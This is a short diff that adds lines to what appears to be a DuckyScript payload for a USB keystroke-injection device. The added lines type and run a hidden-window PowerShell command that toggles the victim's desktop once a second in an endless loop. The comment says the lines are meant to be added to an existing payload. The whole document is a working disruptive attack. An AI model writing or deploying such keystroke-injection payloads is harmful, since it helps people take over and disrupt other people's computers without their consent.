@@ -1,0 +1,4 @@
+REM add to the original code for it to take the desired effect
+
+STRING powershell -w h -c "$shell=New-Object -ComObject Shell.Application;while(1){$shell.ToggleDesktop();Start-Sleep 1}"
+ENTER
